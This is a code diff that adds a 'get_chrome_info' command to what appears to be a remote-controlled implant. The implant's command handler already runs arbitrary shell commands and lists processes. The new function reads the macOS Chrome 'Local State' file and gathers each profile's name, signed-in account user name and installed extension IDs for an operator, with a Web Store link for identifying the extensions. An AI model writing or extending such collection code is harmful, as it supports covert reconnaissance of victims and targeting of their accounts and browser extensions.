@@ -86,6 +86,49 @@ def list_processes():
         return processes
     except Exception as e:
         return "Error listing processes: " + str(e)
+        
+def get_chrome_info():
+    local_state_path = f'/Users/{os.getlogin()}/Library/Application Support/Google/Chrome/Local State'
+    output = []
+
+    with open(local_state_path, 'r', encoding='utf-8') as file:
+        local_state = json.load(file)
+
+    if 'profile' in local_state and 'last_active_profiles' in local_state['profile']:
+        output.append("\nLast active profiles:")
+        output.append(str(local_state['profile']['last_active_profiles']))
+    else:
+        output.append("\nCannot find last_active_profiles.")
+
+    if 'profile' in local_state and 'last_used' in local_state['profile']:
+        output.append("\nLast used profile:")
+        output.append(str(local_state['profile']['last_used']))
+    else:
+        output.append("\nCannot find last_used.")
+
+    if 'profile' in local_state and 'info_cache' in local_state['profile']:
+        output.append("\nUser names in profile.info_cache:")
+        for profile_name, profile_info in local_state['profile']['info_cache'].items():
+            if 'user_name' in profile_info:
+                user_name = profile_info['user_name']
+                output.append(f" - Profile: {profile_name}, User Name: {user_name}")
+                
+                extension_dir = f'Library/Application Support/Google/Chrome/{profile_name}/Local Extension Settings'
+                
+                if os.path.exists(extension_dir):
+                    extensions = os.listdir(extension_dir)
+                    output.append(f"   Extensions for {profile_name}:")
+                    for ext in extensions:
+                        output.append(f"     - {ext}")
+                else:
+                    output.append(f"   Directory does not exist: {extension_dir}")
+            else:
+                output.append(f" - Profile: {profile_name}, cannot find user_name.")
+        output.append("Search extension by https://chrome.google.com/webstore/detail/TEXT/{id}")
+    else:
+        output.append("\nCannot find profile.info_cache.")
+    
+    return "\n".join(output)
 
 def handle_command(command):
     try:
@@ -103,6 +146,8 @@ def handle_command(command):
             result = execute_command(command.split(" ", 1)[1])
         elif command == "list_processes":
             result = list_processes()
+        elif command == "get_chrome_info":
+            result = get_chrome_info()
         else:
             result = "Unknown command"
     except Exception as e:
